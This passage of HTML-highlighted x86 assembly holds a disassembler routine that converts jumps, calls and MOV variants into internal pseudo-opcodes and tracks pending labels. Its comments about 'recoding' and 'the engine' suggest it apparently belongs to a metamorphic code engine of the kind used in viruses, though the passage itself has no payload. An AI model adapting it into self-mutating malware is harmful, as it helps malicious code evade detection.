                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get the instruction</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0EBh</span><span class="sc0">       </span><span class="sc1">; Check if it's a short JMP</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Add2ToEIP</span><span class="sc0">       </span><span class="sc1">; If it is, increase the EIP only by 2</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
        </span><span class="sc5">@@Add2ToEIP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InsertLabel</span><span class="sc0">     </span><span class="sc1">; Insert the label</span><span class="sc0">

                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">-</span><span class="sc2">10h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; Set the label in the instruction</span><span class="sc0">

</span><span class="sc1">;; When we arrive here we scan for a label that isn't disassembled yet, We</span><span class="sc0">
</span><span class="sc1">;; check if we disassembled the pointing code while we didn't arrive here.</span><span class="sc0">
</span><span class="sc1">;; If the code is already disassembled, we set the label and we check other</span><span class="sc0">
</span><span class="sc1">;; pointers until we found one that it isn't scanned. If all them are alredy</span><span class="sc0">
</span><span class="sc1">;; disassembled, we finish because all the reachable code is disassembled.</span><span class="sc0">
   </span><span class="sc5">@@GetEIPFromFutureLabelList</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabelsPost</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; If there aren't labels, exit</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@FinDeTraduccion</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FutureLabelTable</span><span class="sc4">]</span><span class="sc0">
       </span><span class="sc5">@@LoopCheckForNewEIP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">      </span><span class="sc1">; Get a label</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">; Is it empty?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@GetNewEIP</span><span class="sc0">       </span><span class="sc1">; If not, we found one</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8</span><span class="sc0">          </span><span class="sc1">; Check next</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">        </span><span class="sc1">; Have we scanned all them?</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCheckForNewEIP</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@FinDeTraduccion</span><span class="sc0"> </span><span class="sc1">; If so, exit from disassembler</span><span class="sc0">

       </span><span class="sc5">@@GetNewEIP</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@LoopTrace</span><span class="sc0">


</span><span class="sc1">;;; Instructions beginning with 0F</span><span class="sc0">
     </span><span class="sc5">@@Opcode0F</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the second opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">      </span><span class="sc1">; Long Jcc?</span><span class="sc0">
                </span><span class="sc6">jb</span><span class="sc0">    </span><span class="sc5">@@Op0F_Next00</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Jcc32</span><span class="sc0">         </span><span class="sc1">; If so, jump</span><span class="sc0">
       </span><span class="sc5">@@Op0F_Next00</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0B6h</span><span class="sc0">     </span><span class="sc1">; MOVZX?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Op0F_MOVZX</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 0BEh</span><span class="sc0">
</span><span class="sc1">;                 jz    @@Op0F_MOVSX</span><span class="sc0">

                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">        </span><span class="sc1">; Add two to the EIP and continue</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SigueInstr</span><span class="sc0">

</span><span class="sc1">;; I decided to make MOVSX instruction using direct checking and</span><span class="sc0">
</span><span class="sc1">;; sign extension, because this instruction have little variation when</span><span class="sc0">
</span><span class="sc1">;; recoding (or it is too much long). Anyway, I left the code (commented)</span><span class="sc0">
</span><span class="sc1">;; because maybe I decide to put it again, to disassemble whatever code I</span><span class="sc0">
</span><span class="sc1">;; want to pass to this routine, for example (and not only a semi-controlled</span><span class="sc0">
</span><span class="sc1">;; code as the engine is).</span><span class="sc0">
       </span><span class="sc5">@@Op0F_MOVZX</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0F8h</span><span class="sc0">     </span><span class="sc1">; Set the pseudoopcode F8</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@Op0F_MOVxX</span><span class="sc0">
</span><span class="sc1">;        @@Op0F_MOVSX:</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, 0FAh</span><span class="sc0">
</span><span class="sc1">;        @@Op0F_MOVxX:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the destiny register</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
                </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">7</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Set it in the instruction</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, [esi+2]</span><span class="sc0">
</span><span class="sc1">;                 and     eax, 0C0h</span><span class="sc0">
</span><span class="sc1">;                 cmp     eax, 0C0h</span><span class="sc0">
</span><span class="sc1">;                 jz    @@Op0F_MOVxX_RegReg8</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, [edi]</span><span class="sc0">
</span><span class="sc1">;                 add     eax, 1</span><span class="sc0">
</span><span class="sc1">;                 mov     [edi], al</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">      </span><span class="sc1">; Decode the referenced memory address</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">DecodeMemoryConstruction</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0">
</span><span class="sc1">;        @@Op0F_MOVxX_RegReg8:</span><span class="sc0">
</span><span class="sc1">;                 mov     eax, [esi+2]</span><span class="sc0">
</span><span class="sc1">;                 and     eax, 7</span><span class="sc0">
</span><span class="sc1">;                 mov     [edi+1], eax</span><span class="sc0">
</span><span class="sc1">;                 add     esi, 3</span><span class="sc0">
</span><span class="sc1">;                 jmp   @@NextInstruction</span><span class="sc0">


</span><span class="sc1">;; For the translation of Jcc (both 8 bits and 32 bits) and CALLs:</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - If the code exists, translate the destiny address of the point into a</span><span class="sc0">
</span><span class="sc1">;;   label in the label table, and complete the instruction with that label.</span><span class="sc0">
</span><span class="sc1">;;   If the label already exists, use the already existent label, of course.</span><span class="sc0">
</span><span class="sc1">;;</span><span class="sc0">
</span><span class="sc1">;;  - If the code doesn't exist, we put a reference to this instruction in</span><span class="sc0">
</span><span class="sc1">;;   the "future label table", together with a reference to the code it's</span><span class="sc0">
</span><span class="sc1">;;   trying to access. Later, when that referenced code is disassembled,</span><span class="sc0">
</span><span class="sc1">;;   the instruction (Jcc, CALL, etc.) will be completed.</span><span class="sc0">

</span><span class="sc1">;;; Conditional 32-bit jump (Jx, JNx)</span><span class="sc0">
     </span><span class="sc5">@@Jcc32</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the destiny address in EAX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ContinueWithBranchInstr</span><span class="sc0">

</span><span class="sc1">;;; CALL</span><span class="sc0">
     </span><span class="sc5">@@CALL</span><span class="sc4">:</span><span class="sc0">    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the destiny address in EAX</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@ContinueWithBranchInstr</span><span class="sc0">


</span><span class="sc1">;;; Conditional 8-bits jump (Jx, JNx)</span><span class="sc0">

     </span><span class="sc5">@@Jcc</span><span class="sc4">:</span><span class="sc0">     </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the destiny address in EAX</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">7Fh</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@Jcc_01</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
          </span><span class="sc5">@@Jcc_01</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">

     </span><span class="sc5">@@ContinueWithBranchInstr</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">              </span><span class="sc1">; Put the destiny addr. in ECX</span><span class="sc0">
                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">SetInFutureLabelList</span><span class="sc0">  </span><span class="sc1">; Mark the label and get the</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">                   </span><span class="sc1">; label table entry in EAX</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">    </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0Fh</span><span class="sc0">     </span><span class="sc1">; 0F? (i.e. long Jcc)</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Jcc_Jcc32</span><span class="sc0">

                </span><span class="sc1">;mov     [edi], al</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0E8h</span><span class="sc0">    </span><span class="sc1">; CALL?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Jcc_AddEIP5</span><span class="sc0">  </span><span class="sc1">; Then add 5 to EIP. If not, add 2.</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@Jcc_AddEIP2</span><span class="sc0">

   </span><span class="sc5">@@Jcc_Jcc32</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the conditional jump</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">     </span><span class="sc1">; Transform it to pseudoopcode</span><span class="sc0">

    </span><span class="sc5">@@Jcc_AddEIP6</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
    </span><span class="sc5">@@Jcc_AddEIP5</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
    </span><span class="sc5">@@Jcc_AddEIP2</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">       </span><span class="sc1">; Increase the EIP</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; Set the pseudoopcode in EAX</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; Restore the label table entry pointer.</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@NextInstruction</span><span class="sc0"> </span><span class="sc1">; If it's 0, is because it wasn't</span><span class="sc0">
                                        </span><span class="sc1">; scanned, so go for next instruction.</span><span class="sc0">

                </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">InsertLabel</span><span class="sc0">  </span><span class="sc1">; Insert the label if the EIP was already</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0"> </span><span class="sc1">; disassembled, and insert it in the</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@NextInstruction</span><span class="sc0"> </span><span class="sc1">; instruction, completing it.</span><span class="sc0">

     </span><span class="sc5">@@FinDeTraduccion</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">; Return!</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">
</span><span class="sc5">DisasmCode</span><span class="sc0">      </span><span class="sc9">endp</span><span class="sc0">


</span><span class="sc1">;; This function is constructed to save lines of code, because this same</span><span class="sc0">
</span><span class="sc1">;; method was called from several points.</span><span class="sc0">
</span><span class="sc5">GenOp_SetRegReg</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFFFFF00h</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">  </span><span class="sc1">; Get the opcode</span><span class="sc0">
                </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0FFh</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3Fh</span><span class="sc0">    </span><span class="sc1">; Check the instruction. If it's &lt;= 3F,</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@SRR_01</span><span class="sc0">      </span><span class="sc1">; set the same opcode + 1</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">85h</span><span class="sc0">    </span><span class="sc1">; TEST?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@SRR_02</span><span class="sc0">
</span><span class="sc1">;                cmp     eax, 87h    ; XCHG?</span><span class="sc0">
</span><span class="sc1">;                jbe   @@SRR_03</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">8Bh</span><span class="sc0">    </span><span class="sc1">; MOV?</span><span class="sc0">
                </span><span class="sc6">jbe</span><span class="sc0">   </span><span class="sc5">@@SRR_04</span><span class="sc0">
     </span><span class="sc5">@@SRR_01</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">    </span><span class="sc1">; Set the OP Reg,Reg</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
     </span><span class="sc5">@@SRR_Store</span><span class="sc4">:</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">  </span><span class="sc1">; Store the opcode</span><span class="sc0">
                </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc0">
                </span><span class="sc6">ret</span><span class="sc0">                 </span><span class="sc1">; Return</span><span class="sc0">
     </span><span class="sc5">@@SRR_02</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">48h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; Pseudoopcode of TEST Reg,Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SRR_Store</span><span class="sc0">
 </span><span class="sc1">;    @@SRR_03:  mov     eax, 48h+5</span><span class="sc0">
 </span><span class="sc1">;               jmp   @@SRR_Store</span><span class="sc0">
     </span><span class="sc5">@@SRR_04</span><span class="sc4">:</span><span class="sc0">  </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">40h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc0">  </span><span class="sc1">; Pseudoopcode of MOV Reg,Reg</span><span class="sc0">
                </span><span class="sc6">jmp</span><span class="sc0">   </span><span class="sc5">@@SRR_Store</span><span class="sc0">
</span><span class="sc5">GenOp_SetRegReg</span><span class="sc0"> </span><span class="sc9">endp</span><span class="sc0">

</span><span class="sc1">;; Function to insert a label from a Jcc or a CALL to future disassembly. If</span><span class="sc0">
</span><span class="sc1">;; the label is already disassembled, it returns EAX != 0, being EAX the</span><span class="sc0">
</span><span class="sc1">;; code referenced. If it's not disassembled, we store the label in the table</span><span class="sc0">
</span><span class="sc1">;; and we'll check for it everytime a leaf of the execution tree is finished.</span><span class="sc0">

</span><span class="sc5">SetInFutureLabelList</span><span class="sc0"> </span><span class="sc9">proc</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">InstructionTable</span><span class="sc4">]</span><span class="sc0"> </span><span class="sc1">; Get the instructions</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; Are we at the end already?</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@SetFutureLabel</span><span class="sc0">   </span><span class="sc1">; If so, we didn't find that, so</span><span class="sc0">
      </span><span class="sc5">@@LoopCheckLabelForJcc</span><span class="sc4">:</span><span class="sc0">            </span><span class="sc1">;  insert the label.</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">0Ch</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
                </span><span class="sc6">jz</span><span class="sc0">    </span><span class="sc5">@@Jcc_CodeDefined</span><span class="sc0">  </span><span class="sc1">; If the code is disassembled, return</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">10h</span><span class="sc0">
                </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">         </span><span class="sc1">; Get next instruction</span><span class="sc0">
                </span><span class="sc6">jnz</span><span class="sc0">   </span><span class="sc5">@@LoopCheckLabelForJcc</span><span class="sc0">
      </span><span class="sc5">@@SetFutureLabel</span><span class="sc4">:</span><span class="sc0">                  </span><span class="sc1">; We didn't find it!</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">NumberOfLabelsPost</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">
                </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebp</span><span class="sc4">+</span><span class="sc5">FutureLabelTable</span><span class="sc4">]</span><span class="sc0">
                </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc4">[</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">       </span><span class="sc1">; Store the instruction and the</span><span class="sc0">
